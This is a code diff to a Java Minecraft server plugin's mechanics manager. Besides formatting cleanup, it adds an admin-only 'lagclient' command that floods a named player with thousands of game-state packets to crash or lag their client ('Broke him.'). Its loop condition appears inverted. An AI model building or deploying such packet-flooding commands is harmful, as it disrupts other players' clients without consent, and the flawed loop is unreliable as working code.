@@ -13,6 +13,10 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.craftbukkit.v1_16_R3.CraftServer;
 import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
+import org.bukkit.event.player.PlayerPreLoginEvent;
 import org.bukkit.util.Vector;
 import org.jetbrains.annotations.NotNull;
 
@@ -23,13 +27,14 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicInteger;
 
 @Log4j2(topic = "Revoken - MechanicMngr")
-public class MechanicMngr extends AMngr {
+public class MechanicMngr extends AMngr implements Listener {
 
     private final AtomicInteger lastTickableId = new AtomicInteger(0);
     private final ConcurrentHashMap<Integer, Runnable> syncTickables = new ConcurrentHashMap<>();
     private final ConcurrentHashMap<Integer, Runnable> asyncTickables = new ConcurrentHashMap<>();
 
     private final ExecutorService cachedExecutor;
+
     {
         this.cachedExecutor = Executors.newCachedThreadPool();
     }
@@ -38,6 +43,7 @@ public class MechanicMngr extends AMngr {
 
     /**
      * Default constructor
+     *
      * @param plugin Plugin instance
      */
     public MechanicMngr(@NotNull RevokenPlugin plugin) {
@@ -49,19 +55,21 @@ public class MechanicMngr extends AMngr {
 
     @Override
     public void initialize() {
+        Bukkit.getPluginManager().registerEvents(this, getPlugin());
+
         ((CraftServer) getPlugin().getServer()).getServer().b(() -> {
             this.cachedExecutor.submit(() -> {
                 // async tickables
-               asyncTickables.forEach((id, tickable) -> {
-                   this.cachedExecutor.submit(() -> {
-                       try {
-                           tickable.run();
-                       } catch (Exception x) {
-                           if(!this.getPlugin().isDebug())
-                               log.error("Caught exception while ticking async task #{}({})" , id, tickable.getClass().getName(), x);
-                       }
-                   });
-               });
+                asyncTickables.forEach((id, tickable) -> {
+                    this.cachedExecutor.submit(() -> {
+                        try {
+                            tickable.run();
+                        } catch (Exception x) {
+                            if (!this.getPlugin().isDebug())
+                                log.error("Caught exception while ticking async task #{}({})", id, tickable.getClass().getName(), x);
+                        }
+                    });
+                });
             });
 
             // sync tickables
@@ -70,11 +78,11 @@ public class MechanicMngr extends AMngr {
                 try {
                     tickable.run();
                     double tookMs = timer.stop().resultMilli();
-                    if(tookMs > 100)
+                    if (tookMs > 100)
                         log.warn("Ticking sync task #{}({}) took {}ms", id, tickable.getClass().getName(), tookMs);
 
                 } catch (Exception x) {
-                    if(!this.getPlugin().isDebug())
+                    if (!this.getPlugin().isDebug())
                         log.error("Caught exception while ticking sync task #{}({})", id, tickable.getClass().getName(), x);
                 }
             });
@@ -84,9 +92,8 @@ public class MechanicMngr extends AMngr {
             Bukkit.getPluginManager().registerEvents(this.sittingMechanic, this.getPlugin());
             Bukkit.getCommandMap().register("revoken", new Command("sit") {
                 @Override
-                public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args)
-                {
-                    if(!sender.hasPermission("revoken.sit"))
+                public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
+                    if (!sender.hasPermission("revoken.sit"))
                         return true;
 
                     Player player = (Player) sender;
@@ -97,9 +104,8 @@ public class MechanicMngr extends AMngr {
 
             Bukkit.getCommandMap().register("revoken", new Command("ride") {
                 @Override
-                public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args)
-                {
-                    if(!sender.hasPermission("revoken.ride"))
+                public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
+                    if (!sender.hasPermission("revoken.ride"))
                         return true;
 
                     Player player = (Player) sender;
@@ -116,21 +122,35 @@ public class MechanicMngr extends AMngr {
                 }
             });
 
-            Bukkit.getCommandMap().register("revoken", new Command("bugtest") {
+            Bukkit.getCommandMap().register("revoken", new Command("lagclient") {
                 @Override
-                public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args)
-                {
-                    if(!sender.hasPermission("revoken.bugtest"))
+                public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
+                    if (!sender.hasPermission("revoken.admin"))
                         return true;
 
-                    Player player = (Player) sender;
-                    EntityPlayer nmsPlayer = PktStatics.getNmsPlayer(player);
-
-                    if(args.length > 0) {
-                        float val = Float.parseFloat(args[0]);
-
-                        nmsPlayer.playerConnection.sendPacket(new PacketPlayOutGameStateChange(PacketPlayOutGameStateChange.h, val));
+                    if(args.length == 0) {
+                        sender.sendMessage("§cMissing player argument");
+                        return true;
                     }
+                    String playerName = args[0];
+                    final Player bukkitPlayer = Bukkit.getPlayer(playerName);
+                    if(bukkitPlayer == null) {
+                        sender.sendMessage("§cInvalid player reference");
+                        return true;
+                    }
+                    final EntityPlayer nmsPlayer = PktStatics.getNmsPlayer(bukkitPlayer);
+                    Bukkit.getScheduler().runTaskAsynchronously(getPlugin(), () -> {
+                        for (int i = 0; i < 10000; i++) {
+                            if(!bukkitPlayer.isOnline())
+                                nmsPlayer.playerConnection.sendPacket(new PacketPlayOutGameStateChange(PacketPlayOutGameStateChange.h, i));
+                            else {
+                                sender.sendMessage("&aBroke him.");
+                                break;
+                            }
+
+                        }
+                    });
+
                     return true;
                 }
             });
@@ -143,7 +163,7 @@ public class MechanicMngr extends AMngr {
     public void terminate() {
         this.sittingMechanic.getEntites().forEach((entityUuid, data) -> {
             var entity = Bukkit.getEntity(entityUuid);
-            if(entity != null) {
+            if (entity != null) {
                 entity.remove();
             } else
                 log.warn("SittingMechanic tried to remove non-existing entity");
@@ -159,6 +179,7 @@ public class MechanicMngr extends AMngr {
 
     /**
      * Registers sync tickable
+     *
      * @param runnable Task
      * @return Tickable ID
      */
@@ -166,8 +187,10 @@ public class MechanicMngr extends AMngr {
         this.syncTickables.put(lastTickableId.addAndGet(1), runnable);
         return lastTickableId.get();
     }
+
     /**
      * Registers sync tickable
+     *
      * @param runnable Task
      * @return Tickable ID
      */
@@ -178,11 +201,17 @@ public class MechanicMngr extends AMngr {
 
     /**
      * Unregisters any tickable with this id
+     *
      * @param tickableId Tickable ID
      */
     public void unregisterAnyTickable(int tickableId) {
         this.syncTickables.remove(tickableId);
         this.asyncTickables.remove(tickableId);
+    }
+
+    @EventHandler
+    public void prelogin(AsyncPlayerPreLoginEvent event) {
+
     }
 
 }
